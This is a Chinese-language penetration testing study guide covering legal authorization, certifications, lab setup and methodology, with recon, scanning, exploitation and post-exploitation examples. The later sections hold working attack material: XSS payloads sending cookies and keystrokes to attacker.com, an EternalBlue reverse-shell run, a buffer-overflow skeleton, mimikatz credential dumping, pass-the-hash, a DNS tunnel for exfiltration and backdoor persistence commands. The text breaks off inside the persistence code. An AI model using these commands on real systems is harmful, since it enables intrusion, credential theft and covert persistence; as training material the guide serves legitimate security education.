# 渗透测试完整学习指南

## 📋 学习路线图

```
基础准备(3-4周) → 方法论(2周) → 信息收集(2-3周) → 漏洞利用(4-6周) → 后渗透(3-4周) → 专项技术(6-8周) → 报告编写(1-2周) → 实战演练(持续)
```

## ⚖️ 法律声明与职业道德

> **严正声明**: 渗透测试必须在获得明确书面授权的前提下进行！

### 合法使用场景
- ✅ 获得书面授权的企业安全评估项目
- ✅ 正规漏洞赏金计划（遵守平台规则）
- ✅ 合法的安全竞赛和CTF环境
- ✅ 个人搭建的实验室环境
- ✅ 教育机构的教学实践活动

### 严格禁止
- ❌ 未经授权访问任何系统或网络
- ❌ 破坏性测试和数据破坏
- ❌ 窃取、篡改、删除他人数据
- ❌ 利用漏洞进行勒索、敲诈
- ❌ 传播恶意软件和攻击工具

### 渗透测试授权书必备要素
```
1. 明确的测试范围
   - IP地址段/域名列表
   - 测试系统清单
   - 明确排除的系统

2. 测试时间窗口
   - 开始时间和结束时间
   - 允许的测试时段
   - 紧急停止机制

3. 测试方法和限制
   - 允许的测试技术
   - 禁止的操作（如DoS攻击）
   - 最大影响程度

4. 数据保护和保密
   - 数据处理规范
   - 保密期限
   - 数据销毁要求

5. 责任和免责
   - 测试方责任范围
   - 委托方配合义务
   - 意外情况处理

6. 法律效力
   - 双方法人签字
   - 公司盖章
   - 法律顾问审核
```

---

## 模块一：基础准备与职业规范

### 模块概览（学习目标与成果）
- **核心定位**：帮助学习者建立渗透测试的正确认知、法律边界与职业操守，理解红队行动中常见的组织协作与交付规范。
- **达成指标**：能独立规划个人学习路径、完成授权流程、搭建基础实验环境，并熟悉常用标准及认证体系。
- **配套输出**：授权文档模板、渗透测试项目启动清单、安全合规对照表、个人能力成长计划。

> 建议学习节奏：
> - 第1周：法律与伦理、行业标准、常用工具体系梳理。
> - 第2周：职业素养演练、项目文档撰写、企业安全流程模拟。
> - 第3周：完成模块实践作业（授权书撰写 + 环境搭建 + 自检表）。

#### 能力分层矩阵
| 能力维度 | 入门要求 | 进阶要求 | 专家要求 |
| --- | --- | --- | --- |
| 法律与合规 | 能列举国内外典型法规与违规处罚 | 能根据项目场景匹配合规要求并输出建议 | 能设计企业级安全合规治理体系并给出度量指标 |
| 职业素养 | 理解授权边界与信息保密原则 | 能与甲方沟通范围、风险、影响，形成共识 | 主导跨部门沟通，制定应急预案与影响控制策略 |
| 环境搭建 | 完成本地实验室初始安装 | 构建多区域、多角色的靶场并支持快照回滚 | 设计企业级蓝红对抗靶场，覆盖多云、多端场景 |
| 文档交付 | 能输出基础测试计划与日报 | 能编写符合规范的渗透测试报告 | 建立模板库、度量体系和自动化报告管线 |

#### 学习前置要求自检
- ✅ 熟悉基础网络知识（OSI、TCP/IP、常见端口协议）。
- ✅ 具备Linux基本操作能力与命令行使用习惯。
- ✅ 拥有虚拟化环境或云主机资源（VirtualBox/VMware/Proxmox/公有云）。
- ✅ 能够阅读英文技术文档，关注官方安全公告。

### 案例：企业级渗透测试项目启动
**场景设定**：一家金融科技公司准备在生产环境上线新的在线交易平台，希望在上线前完成一次授权的渗透测试评估。你作为渗透测试工程师，需要完成从需求沟通、范围确认到测试计划制定的全流程准备。

**执行步骤**：
1. **需求确认会**（1天）
   - 收集业务背景、系统架构、上线时间、关键资产。
   - 确定测试范围：前端域名、API网关、后台管理、数据库、第三方接口。
   - 明确访问方式：测试账户、VPN/堡垒机、凭证管理机制。
2. **风险评估与限制**（1天）
   - 与甲方讨论业务影响容忍度：是否允许DoS、是否允许生产数据读写。
   - 定义紧急联系机制、测试窗口、回滚策略。
   - 确定敏感系统排除项：财务核心账务、支付核心交易链路。
3. **授权文件与保密协议**（0.5天）
   - 输出授权书草稿，明确责任、免责条款。
   - 双方签署电子版，归档并建立版本控制。
4. **测试计划编制**（1.5天）
   - 制定测试目标、方法、工具清单和交付物列表。
   - 安排每日沟通节奏：日报、风险提示、里程碑评审。
5. **环境与工具准备**（1天）
   - 搭建VPN连接、测试账号、访问白名单。
   - 配置工具链：kali环境、Burp、Nmap、Cobalt Strike等。
6. **启动会议**（0.5天）
   - 对齐时间线、紧急联系人、成果验收标准。
   - 明确日志与证据管理规范。

**预期产出**：
```
├── 项目启动资料
│   ├── 00-授权书-v1.0.pdf
│   ├── 01-保密协议.pdf
│   ├── 02-测试范围核对表.xlsx
│   └── 03-风险沟通与应急联系人表.xlsx
├── 测试计划
│   ├── 计划说明书.md
│   ├── 工具与方法对照表.xlsx
│   └── 时间线与里程碑.gantt
└── 环境配置
    ├── VPN配置手册.md
    ├── Kali镜像与初始化脚本
    └── 证据存储结构约定.txt
```

**案例复盘要点**：
- 通过精准的范围管理避免影响生产系统的核心链路。
- 在启动阶段建立沟通机制，减少信息不对称导致的风险。
- 对工具链进行版本管理，保证可复现性和合规性。

### 进阶拓展与读书清单
- **关注标准**：ISO/IEC 27001、GB/T 22239、PTES、OWASP SAMM。
- **推荐阅读**：《The Hacker Playbook》《渗透测试实践指南（第2版）》《红蓝对抗中的攻防之道》。
- **网络资源**：关注CNCERT、MSRC、阿里云先知社区、奇安信CERT周报。
- **实战提升**：参与国家级护网演练公开报告分析，提炼攻防策略；定期复盘历年红队行动案例。

### 风险提示与常见失误
1. **授权范围模糊**：未明确IP段、接口、第三方系统，导致越权操作。
2. **日志留存不完整**：缺乏操作记录，出现争议时无法举证。
3. **沟通渠道单一**：未建立微信群/IM群组，信息传递滞后。
4. **工具合法性问题**：使用未经授权的软件或未隔离影响生产的扫描器。
5. **安全意识不足**：忽视数据脱敏与敏感信息处理要求。

> **自我检验**：
> - 能否在30分钟内说明渗透测试流程、角色分工、关键风险点？
> - 是否掌握常见合规要求（等保2.0、GDPR、PCI-DSS）之间的差异？
> - 能否输出一份结构化的测试计划书并获得甲方认可？

### 1.1 基本概念与定义

#### 渗透测试的本质
**定义**: 渗透测试是一种通过模拟黑客攻击来评估系统、网络或应用程序安全性的方法，目的是在真正的攻击者发现漏洞之前识别并修复安全弱点。

**核心目标**:
```
1. 发现安全漏洞
   - 技术漏洞（软件缺陷、配置错误）
   - 逻辑漏洞（业务流程缺陷）
   - 人员漏洞（安全意识薄弱）

2. 评估风险影响
   - 漏洞可利用性
   - 业务影响程度
   - 数据泄露风险

3. 验证安全控制
   - 防火墙有效性
   - IDS/IPS检测能力
   - 安全响应机制

4. 提供修复建议
   - 技术修复方案
   - 管理流程改进
   - 安全培训需求
```

#### 渗透测试类型

**黑盒测试 (Black Box)**:
```
特点:
- 测试者不了解系统内部结构
- 模拟外部攻击者视角
- 依赖公开信息和工具

优势:
- 真实模拟外部威胁
- 不受内部知识影响
- 发现未知暴露面

劣势:
- 耗时较长
- 可能遗漏深层漏洞
- 覆盖率有限

适用场景:
- 外部Web应用测试
- 互联网暴露服务
- 模拟APT攻击
```

**白盒测试 (White Box)**:
```
特点:
- 完全了解系统架构和代码
- 拥有源代码访问权限
- 结合代码审计

优势:
- 覆盖率高
- 发现深层漏洞
- 时间效率高

劣势:
- 成本较高
- 需要专业代码审计能力
- 可能忽视外部视角

适用场景:
- 软件开发生命周期
- 核心系统安全评估
- 合规审计要求
```

**灰盒测试 (Gray Box)**:
```
特点:
- 部分了解系统信息
- 拥有有限的凭证
- 平衡黑盒和白盒

优势:
- 效率和覆盖率平衡
- 模拟内部威胁
- 成本相对较低

劣势:
- 需要协调获取信息
- 测试范围需明确界定

适用场景:
- 内网渗透测试
- 员工权限滥用评估
- 混合环境测试
```

### 1.2 职业素养与认证

#### 职业道德规范

**核心原则**:
```python
# 渗透测试工作者道德准则

class PenetrationTesterEthics:
    def __init__(self):
        self.principles = {
            "诚信": "真实报告发现，不夸大或隐瞒漏洞",
            "保密": "严格保护客户数据和测试结果",
            "授权": "仅在授权范围内进行测试",
            "最小影响": "避免对业务造成不必要的影响",
            "持续学习": "保持技术更新和职业发展",
            "社会责任": "促进网络安全，保护公共利益"
        }

    def check_authorization(self, target, scope):
        """
        检查测试授权
        """
        if not self.has_written_authorization(target):
            raise Exception("未获得书面授权，禁止测试！")

        if target not in scope:
            raise Exception("目标不在授权范围内！")

        return True

    def minimize_impact(self, action):
        """
        评估操作影响
        """
        impact_level = self.assess_impact(action)

        if impact_level == "HIGH":
            # 高影响操作需要额外确认
            return self.request_approval(action)

        return True

    def protect_data(self, sensitive_data):
        """
        保护敏感数据
        """
        # 加密存储
        encrypted = self.encrypt(sensitive_data)

        # 访问控制
        self.set_access_control(encrypted, level="RESTRICTED")

        # 定期销毁
        self.schedule_destruction(encrypted, days=90)

        return encrypted
```

#### 行业认证体系

**国际认证**:

**CEH (Certified Ethical Hacker)**:
```
认证机构: EC-Council
难度: ★★★☆☆ (中等)
费用: $950 (考试费)

考试形式:
- 125道选择题
- 4小时考试时间
- 60%通过分数线

知识领域:
1. 网络安全基础
2. 信息收集技术
3. 漏洞扫描
4. 系统渗透
5. Web应用安全
6. 无线网络安全
7. 社会工程学
8. 密码学

推荐人群:
- 安全分析师
- 网络工程师
- 安全顾问

备考时间: 2-3个月
```

**OSCP (Offensive Security Certified Professional)**:
```
认证机构: Offensive Security
难度: ★★★★★ (极高)
费用: $999 (含90天实验室访问)

考试形式:
- 23小时45分钟实战考试
- 需攻破多台靶机
- 额外24小时撰写报告

考试要求:
- 攻破5台靶机
- 获得70分（满分100分）
- 提交专业渗透测试报告

技能要求:
1. 信息收集和枚举
2. 缓冲区溢出利用
3. Web应用漏洞
4. 权限提升
5. 横向移动
6. 文档编写能力

推荐人群:
- 有经验的渗透测试人员
- 红队成员
- 安全研究员

备考时间: 6-12个月
通过率: 约30-40%
```

**GPEN (GIAC Penetration Tester)**:
```
认证机构: GIAC/SANS
难度: ★★★★☆ (较高)
费用: $2,499

考试形式:
- 115道选择题
- 3小时考试时间
- 74%通过分数线

知识领域:
1. 合法与道德问题
2. 信息收集
3. 扫描与枚举
4. 漏洞利用
5. 密码攻击
6. 后渗透技术
7. Web应用测试

推荐人群:
- 渗透测试团队领导
- 安全架构师
- 合规审计人员
```

**国内认证**:

**CISP-PTE (注册信息安全专业人员-渗透测试工程师)**:
```
认证机构: 中国信息安全测评中心
难度: ★★★☆☆
费用: 约12,800元人民币

考试形式:
- 理论考试（100题，90分钟）
- 实操考试（渗透测试场景）

知识域:
1. 渗透测试基础
2. Web应用安全
3. 系统安全
4. 数据库安全
5. 无线网络安全
6. 报告编写

认证要求:
- 从事信息安全工作2年以上
- 参加官方培训
- 通过理论和实操考试

推荐人群:
- 国内安全从业人员
- 政府机构工作人员
- 合规要求企业
```

### 实验室搭建全流程
1. **设计原则**：安全隔离、易于回滚、可扩展、多场景覆盖。
2. **环境组成**：
   - 攻击者主机：Kali/Parrot，自带常用工具；可搭配Windows渗透测试环境。
   - 靶机集群：包含Web应用、数据库、域控、工作站、移动端模拟器、云服务。
   - 管理节点：使用Proxmox/ESXi/KVM管理虚拟机，支持快照与模板。
   - 日志与监控：部署ELK/Splunk用于记录攻击行为，便于复盘与蓝队演练。
3. **网络拓扑样例**：
   | 区域 | 子网 | 组件 | 说明 |
   | --- | --- | --- | --- |
   | 攻击区 (Red) | 10.10.0.0/24 | Kali、渗透工具容器 | 仅出站访问内网DMZ |
   | DMZ/缓冲区 | 10.10.10.0/24 | Web服务器、API、反向代理 | 对外暴露服务 |
   | 内网区 (Blue) | 10.10.20.0/24 | AD域控、文件服务器、办公终端 | 关键业务资产 |
   | 监控区 | 10.10.30.0/24 | SIEM、蜜罐、日志收集 | 捕获攻防行为 |
4. **自动化部署**：
   - 使用Terraform/Ansible编排云端实验室。
   - 使用Vagrant快速搭建本地多虚拟机环境。
   - 推行基础镜像 → 虚拟机克隆 → 自动初始化脚本的方式。
5. **常见靶场资源**：
   - VulnHub、Metasploitable、DVWA、OWASP Juice Shop、Hackazon。
   - Active Directory靶场（如DetectionLab、ADLab），用于练习域渗透。
   - 云安全实验平台（AWS CloudGoat、Azure Goat），模拟云配置漏洞。
6. **安全注意事项**：
   - 关闭实验室与生产网络之间的路由，避免攻击外溢。
   - 定期重置靶机快照，恢复初始状态。
   - 对工具与样本进行分类存储，避免误用。

### 模块作业与验收标准
| 作业 | 要求 | 验收方式 |
| --- | --- | --- |
| 授权书撰写 | 结合案例输出完整授权书，包含范围/限制/责任 | 由学习伙伴互评，检查条款完整性 |
| 环境部署 | 完成最少3台靶机的实验室搭建，并配置网络隔离 | 提交拓扑图、配置脚本、访问截图 |
| 职业规范演练 | 模拟与甲方的Kick-off会议，输出会议纪要 | 录制会议过程或提交纪要文档 |
| 学习计划制定 | 制订90天学习计划，包含目标、行动、度量指标 | 由导师或同伴审核，给出改进建议 |

> **模块挑战任务**：
> - 在实验室中部署蜜罐（如Cowrie），记录并分析攻击日志。
> - 将实验室环境迁移至云端，利用IaC（基础设施即代码）管理资源。
> - 编写脚本自动生成授权书模板与测试计划，降低重复劳动。

---

## 模块二：渗透测试方法论与交付

### 模块概览（流程掌握与协同）
- **学习目标**：搭建从立项、执行到复盘的端到端渗透测试流程，掌握报告交付标准与风险沟通模式。
- **关键成果**：形成企业级渗透测试流程蓝图、风险评估矩阵、缺陷生命周期管理表、复盘机制手册。
- **实际产出**：
  - 渗透测试作战手册（含使命、目标、角色职责、关键SOP）。
  - 每阶段输入输出表与度量指标。
  - 自动化流水线清单（扫描、漏洞管理、持续监控）。

#### RACI角色分工示例
| 活动 | 甲方安全团队 | 甲方业务团队 | 乙方渗透测试 | 管理层 |
| --- | --- | --- | --- | --- |
| 立项与范围确认 | R | C | A | I |
| 授权与合规审查 | A | C | R | I |
| 测试执行 | C | I | A/R | I |
| 风险提示与应急处置 | R | C | A | I |
| 报告评审 | A | C | R | I |
| 修复验证与复盘 | A | R | C | I |

#### 阶段输入输出清单
| 阶段 | 输入 | 关键活动 | 输出 | 度量指标 |
| --- | --- | --- | --- | --- |
| 项目准备 | 合同、授权书、资产列表 | 范围确认、风险评估、沟通渠道建立 | 项目章程、沟通机制、测试计划 | 计划批准时间、风险确认率 |
| 侦察与枚举 | 资产清单、情报信息 | 被动/主动侦察、服务指纹识别 | 侦察报告、潜在攻击面列表 | 资产覆盖率、关键资产识别率 |
| 漏洞利用 | 枚举结果、漏洞库 | 漏洞验证、链路构建、风险评级 | 利用记录、影响分析、POC脚本 | 有效利用率、中断影响次数 |
| 后渗透 | 已获凭证、访问路径 | 权限提升、横向移动、持久化评估 | 攻击路径图、数据访问证据 | 发现的高价值资产数量、凭证暴露数量 |
| 报告交付 | 所有证据、日志、截图 | 风险归类、建议制定、复现说明 | 渗透测试报告、修复建议清单 | 漏洞修复率、重测通过率 |

### 实战案例：DevSecOps管线渗透测试集成
**企业背景**：某互联网公司采用CI/CD管线快速迭代业务系统，希望将渗透测试嵌入发布流程，实现持续验证。

**落地步骤**：
1. **流程梳理**：绘制开发、测试、发布的流程图，梳理关键节点（代码提交、构建、部署、上线）。
2. **工具整合**：
   - CI阶段接入静态扫描（SAST）与依赖漏洞扫描。
   - 预生产环境部署动态扫描（DAST）与API自动化测试。
   - 每季度安排一次人工渗透测试与紫队演练。
3. **安全闸口设定**：
   - 定义风险分级：阻塞（Critical/High）、延期（Medium）、记录（Low）。
   - 阻塞级别必须在发布前完成修复并通过重测。
4. **证据与追踪**：
   - 在缺陷管理系统（如Jira）中创建漏洞工单，字段包括：风险等级、复现步骤、影响范围、补丁状态。
   - 自动同步至漏洞管理平台（如Kenna、InsightVM）形成闭环。
5. **度量指标构建**：
   - 渗透测试执行频率、渗透测试覆盖率。
   - 漏洞平均修复时长（MTTR）、高危漏洞复测通过率。
   - 每个迭代周期的安全验收率。
6. **复盘改进**：
   - 建立“技术复盘+流程复盘”双维机制，总结成功攻击链条。
   - 将可自动化的步骤沉淀为脚本（如自动截图、报告生成模板）。

**案例输出模板**：
```
├── pipeline-security
│   ├── 00_process_map.drawio
│   ├── 01_controls_matrix.xlsx
│   ├── 02_auto_scan_config.yaml
│   ├── 03_manual_pt_checklist.md
│   ├── 04_findings_tracking.xlsx
│   └── 05_retrospective_review.md
```

> **经验要点**：
> - 将渗透测试与开发节奏对齐，避免成为“阻塞点”。
> - 使用轻量自动化工具（如ZAP CLI、Nuclei）辅助人工测试，提升效率。
> - 建立安全例会机制，让开发、安全、运维共同复盘漏洞成因。

### 进阶拓展：基于威胁情报的攻击模拟
- **威胁建模**：使用MITRE ATT&CK、D3FEND矩阵分析对手战术，映射至自身资产。
- **对手模拟（Adversary Simulation）**：结合情报设计攻击路径，如APT10、APT41的典型手法。
- **紫队演练**：与蓝队共同制定演练目标、检测点、度量指标，并建立攻防知识库。
- **自动化平台**：探索Atomic Red Team、CALDERA等框架实现可重复的攻击模拟。

> **自测清单**：
> 1. 是否能够根据甲方业务绘制攻击面图与流程图？
> 2. 是否能清晰描述每个阶段的输入/输出与风险点？
> 3. 是否掌握至少两套行业标准（PTES、OWASP）并能映射至项目实践？

### 2.1 标准渗透测试流程

#### 阶段1: 前期侦察 (Reconnaissance)

**被动侦察**:
```bash
# 目标: 收集公开信息，不直接接触目标系统

# 1. WHOIS查询
whois target.com
whois -h whois.radb.net AS64512

# 2. DNS信息收集
dig target.com ANY
nslookup -type=any target.com

# 3. 子域名枚举
# 证书透明度日志
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Amass被动模式
amass enum -passive -d target.com -o subdomains.txt

# 4. Google Dorking
site:target.com ext:sql | ext:db | ext:bak
site:target.com inurl:admin | inurl:login
site:target.com intext:"powered by" | intext:"version"

# 5. 社交媒体情报
# - LinkedIn员工信息
# - GitHub代码泄露
# - 招聘网站技术栈

# 6. Shodan搜索
shodan search "hostname:target.com"
shodan search "ssl:target.com"
shodan search "org:'Target Company'"
```

**主动侦察**:
```bash
# 目标: 直接与目标交互，收集详细信息

# 1. 端口扫描
# 快速SYN扫描
sudo nmap -sS -p- -T4 --min-rate 10000 target.com -oA nmap_syn

# 服务版本检测
nmap -sV -p 21,22,80,443,3306,3389 target.com -oA nmap_version

# 操作系统识别
sudo nmap -O target.com

# 2. 服务枚举
# Web服务器指纹
whatweb target.com
curl -I https://target.com

# 3. 目录枚举
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,js,txt

# 4. 子域名暴力破解
dnsrecon -d target.com -t brt -D subdomains.txt

# 5. 网络拓扑探测
traceroute target.com
sudo nmap -sn 192.168.1.0/24 -oA network_discovery
```

**信息整理与分析**:
```python
# 信息收集结果整理脚本

import json
from collections import defaultdict

class ReconDataAnalyzer:
    def __init__(self):
        self.data = {
            'domains': [],
            'subdomains': [],
            'ip_addresses': [],
            'open_ports': defaultdict(list),
            'services': defaultdict(dict),
            'employees': [],
            'emails': [],
            'technologies': []
        }

    def analyze_nmap_results(self, nmap_xml):
        """
        分析Nmap扫描结果
        """
        # 解析XML，提取主机、端口、服务信息
        hosts = self.parse_nmap_xml(nmap_xml)

        for host in hosts:
            ip = host['ip']
            self.data['ip_addresses'].append(ip)

            for port in host['ports']:
                self.data['open_ports'][ip].append({
                    'port': port['number'],
                    'state': port['state'],
                    'service': port['service'],
                    'version': port['version']
                })

    def identify_attack_surface(self):
        """
        识别攻击面
        """
        attack_surface = {
            'web_apps': [],
            'databases': [],
            'remote_access': [],
            'file_sharing': [],
            'email_services': []
        }

        for ip, ports in self.data['open_ports'].items():
            for port_info in ports:
                port = port_info['port']
                service = port_info['service']

                # Web应用
                if port in [80, 443, 8080, 8443]:
                    attack_surface['web_apps'].append({
                        'ip': ip,
                        'port': port,
                        'url': f"http://{ip}:{port}"
                    })

                # 数据库
                elif port in [3306, 1433, 5432, 27017, 6379]:
                    attack_surface['databases'].append({
                        'ip': ip,
                        'port': port,
                        'type': service
                    })

                # 远程访问
                elif port in [22, 23, 3389, 5900]:
                    attack_surface['remote_access'].append({
                        'ip': ip,
                        'port': port,
                        'protocol': service
                    })

        return attack_surface

    def prioritize_targets(self):
        """
        目标优先级排序
        """
        priority_matrix = {
            'CRITICAL': [],  # 高价值目标
            'HIGH': [],      # 重要系统
            'MEDIUM': [],    # 一般系统
            'LOW': []        # 低价值目标
        }

        # 基于服务类型、版本、暴露程度评分
        # ...

        return priority_matrix
```

#### 阶段2: 扫描与枚举 (Scanning & Enumeration)

**端口扫描策略**:
```bash
# 三阶段扫描法

# 阶段1: 快速发现存活主机
sudo nmap -sn 192.168.1.0/24 -oA host_discovery

# 阶段2: 快速识别开放端口
masscan -p1-65535 192.168.1.0/24 --rate=10000 -oL masscan_results.txt

# 阶段3: 详细服务识别
nmap -sV -sC -p $(cat masscan_results.txt | awk '{print $3}' | sort -u | paste -sd,) \
     -iL targets.txt -oA detailed_scan

# 针对性深度扫描
# Web服务
nmap -p 80,443 --script http-enum,http-headers,http-methods target.com

# SMB服务
nmap -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares target.com

# SSH服务
nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos target.com
```

**服务枚举技术**:

**Web服务枚举**:
```bash
# 1. 指纹识别
whatweb -v -a 3 https://target.com
wafw00f https://target.com

# 2. 目录和文件枚举
# Gobuster
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,js,txt,zip,bak \
  -t 50 \
  -o gobuster_results.txt

# Feroxbuster (递归扫描)
feroxbuster -u https://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  --depth 3 \
  -x php html js \
  -o ferox_results.txt

# 3. 参数模糊测试
ffuf -u https://target.com/page?FUZZ=test \
  -w parameters.txt \
  -mc 200,301,302 \
  -o parameter_fuzz.json

# 4. 虚拟主机发现
ffuf -u https://target.com \
  -H "Host: FUZZ.target.com" \
  -w subdomains.txt \
  -mc 200 \
  -o vhost_results.json
```

**SMB服务枚举**:
```bash
# 1. SMB版本和配置
nmap -p 445 --script smb-protocols,smb-security-mode target.com

# 2. 共享枚举
smbclient -L //target.com -N
smbmap -H target.com -u anonymous

# 3. 用户枚举
enum4linux -a target.com
crackmapexec smb target.com -u '' -p '' --users

# 4. 策略枚举
rpcclient -U "" -N target.com
> querydispinfo
> enumdomusers
```

**SNMP枚举**:
```bash
# 1. SNMP社区字符串爆破
onesixtyone -c community.txt target.com

# 2. SNMP信息收集
snmpwalk -v2c -c public target.com
snmp-check target.com -c public

# 3. 特定OID查询
snmpget -v2c -c public target.com .1.3.6.1.2.1.1.5.0  # 系统名称
```

#### 阶段3: 漏洞分析 (Vulnerability Analysis)

**自动化漏洞扫描**:
```bash
# Nessus扫描（商业工具）
# 配置扫描策略 -> 执行扫描 -> 分析报告

# OpenVAS扫描（开源）
openvas-start
# 访问 https://localhost:9392

# Nuclei模板扫描
nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_results.txt

# Nikto Web扫描
nikto -h https://target.com -o nikto_report.html -Format html
```

**手工漏洞验证**:
```python
# SQL注入手工测试脚本

import requests
import time

class SQLInjectionTester:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        self.session = requests.Session()

    def test_error_based(self):
        """
        报错注入测试
        """
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' AND 1=1--",
            "' AND 1=2--",
        ]

        for payload in payloads:
            test_url = f"{self.url}?{self.param}={payload}"
            try:
                response = self.session.get(test_url)

                # 检测SQL错误信息
                error_patterns = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "SQLServer",
                    "PostgreSQL"
                ]

                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        print(f"[+] 可能存在SQL注入: {payload}")
                        print(f"[+] 错误信息: {pattern}")
                        return True

            except Exception as e:
                print(f"[-] 请求失败: {e}")

        return False

    def test_boolean_blind(self):
        """
        布尔盲注测试
        """
        # 基准测试
        baseline_url = f"{self.url}?{self.param}=1"
        baseline_response = self.session.get(baseline_url)
        baseline_length = len(baseline_response.text)

        # True条件
        true_payload = "1' AND '1'='1"
        true_url = f"{self.url}?{self.param}={true_payload}"
        true_response = self.session.get(true_url)

        # False条件
        false_payload = "1' AND '1'='2"
        false_url = f"{self.url}?{self.param}={false_payload}"
        false_response = self.session.get(false_url)

        # 对比响应
        if len(true_response.text) == baseline_length and \
           len(false_response.text) != baseline_length:
            print("[+] 可能存在布尔盲注")
            return True

        return False

    def test_time_blind(self):
        """
        时间盲注测试
        """
        payloads = [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "1' WAITFOR DELAY '00:00:05'--"
        ]

        for payload in payloads:
            test_url = f"{self.url}?{self.param}={payload}"

            start_time = time.time()
            response = self.session.get(test_url)
            elapsed_time = time.time() - start_time

            if elapsed_time >= 5:
                print(f"[+] 可能存在时间盲注")
                print(f"[+] 延迟时间: {elapsed_time:.2f}秒")
                return True

        return False

# 使用示例
tester = SQLInjectionTester("http://target.com/page", "id")
tester.test_error_based()
tester.test_boolean_blind()
tester.test_time_blind()
```

#### 阶段4: 漏洞利用 (Exploitation)

**Web应用漏洞利用**:
```bash
# SQL注入利用
sqlmap -u "http://target.com/page?id=1" \
  --batch \
  --dbs \
  --current-db \
  --dump

# 文件上传漏洞
# 1. 绕过文件类型检测
# 2. 上传Webshell
# 3. 访问Webshell获取Shell

# XSS漏洞利用
# 1. Cookie窃取
<script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script>

# 2. 键盘记录
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**系统漏洞利用**:
```bash
# Metasploit Framework
msfconsole

# 搜索exploit
search ms17-010

# 使用exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target.com
set LHOST attacker.ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# 获得Meterpreter会话
sessions -l
sessions -i 1
```

**自定义Exploit开发**:
```python
# 简单的缓冲区溢出Exploit示例

import socket
import struct

# 目标信息
TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999

# 漏洞参数
OFFSET = 2003  # 覆盖EIP的偏移
RET_ADDR = 0x625011af  # JMP ESP地址

# Shellcode (msfvenom生成)
shellcode = (
    b"\xdb\xc0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x52\xbf\x5e"
    # ... 完整shellcode ...
)

# 构造Payload
payload = b"A" * OFFSET
payload += struct.pack("<I", RET_ADDR)
payload += b"\x90" * 16  # NOP sled
payload += shellcode

# 发送Payload
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))

    # 触发漏洞
    s.send(b"OVERFLOW " + payload + b"\r\n")

    print("[+] Payload sent successfully!")
    s.close()

except Exception as e:
    print(f"[-] Exploit failed: {e}")
```

#### 阶段5: 后渗透 (Post Exploitation)

**权限提升**:
```powershell
# Windows权限提升

# 1. 系统信息收集
systeminfo
whoami /all
net user
net localgroup administrators

# 2. 查找提权机会
# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS
.\winPEASx64.exe

# 3. 利用提权
# UAC绕过
Invoke-EventVwrBypass -Command "powershell.exe -ExecutionPolicy Bypass -File C:\backdoor.ps1"

# Token窃取
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

```bash
# Linux权限提升

# 1. 系统信息收集
uname -a
cat /etc/issue
id
sudo -l

# 2. 查找SUID程序
find / -perm -4000 -type f 2>/dev/null

# 3. LinPEAS枚举
./linpeas.sh

# 4. 内核漏洞利用
./linux-exploit-suggester.sh
gcc exploit.c -o exploit
./exploit
```

**横向移动**:
```bash
# Pass-the-Hash攻击
pth-winexe -U domain/admin%aad3b435b51404eeaad3b435b51404ee:ntlmhash //target.com cmd.exe

# Impacket工具集
psexec.py -hashes :ntlmhash domain/admin@target.com
wmiexec.py -hashes :ntlmhash domain/admin@target.com
smbexec.py -hashes :ntlmhash domain/admin@target.com

# Kerberos攻击
# Golden Ticket
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt"

# 内网扫描
proxychains nmap -sT -Pn 10.0.0.0/24
```

**数据收集与渗出**:
```powershell
# Windows数据收集
# 1. 凭证收集
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 2. 浏览器密码
.\LaZagne.exe browsers

# 3. WiFi密码
netsh wlan show profiles
netsh wlan show profile name="WiFi-Name" key=clear

# 4. 敏感文件搜索
Get-ChildItem -Path C:\ -Include *.doc,*.pdf,*.xls -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*password*" -or $_.Name -like "*confidential*"}

# 数据渗出
# DNS隧道
iodine -f -P password tunnel.attacker.com

# HTTP隧道
python reGeorgSocksProxy.py -u http://target.com/tunnel.aspx -p 1080
```

**持久化**:
```powershell
# Windows持久化

# 1. 注册表Run键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f

# 2. 计划任务
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc daily /st 09:00 /ru SYSTEM

# 3. WMI事件订阅
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemBootFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemBootConsumer"
    CommandLineTemplate = "powershell.exe -NoP -W Hidden -File C:\backdoor.ps1"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# 4. 服务安装
sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
